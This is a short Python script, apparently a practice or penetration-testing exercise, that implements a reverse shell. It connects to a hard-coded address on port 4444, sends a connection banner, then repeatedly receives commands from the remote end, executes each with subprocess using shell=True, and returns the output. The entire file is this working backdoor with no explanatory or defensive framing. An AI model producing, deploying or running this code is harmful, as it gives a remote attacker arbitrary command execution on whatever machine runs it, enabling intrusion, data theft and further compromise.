import socket
import subprocess

def execute_system_command(cmd):
	return subprocess.check_output(cmd, shell=True)

ip = "172.23.15.8"
port = 4444

connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connection.connect((ip, port))

connection.send("\n[+] Connection Established")

while True:
	command = connection.recv(1024)
	result = execute_system_command(command)
	connection.send(result)

connection.close()
